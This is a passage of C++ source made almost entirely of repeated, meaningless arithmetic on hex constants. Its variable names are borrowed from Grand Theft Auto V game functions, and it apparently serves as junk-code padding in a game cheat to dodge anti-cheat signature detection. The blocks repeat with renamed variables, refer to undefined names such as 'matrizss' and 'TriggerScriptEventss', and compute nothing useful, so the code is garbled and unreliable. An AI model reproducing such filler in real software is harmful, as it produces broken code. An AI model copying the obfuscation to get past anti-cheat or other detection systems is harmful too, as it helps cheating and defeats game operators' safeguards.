			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			return vetor.size() - 1;
		}
		namespace String
		{
			std::vector<std::string> GetValues()
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
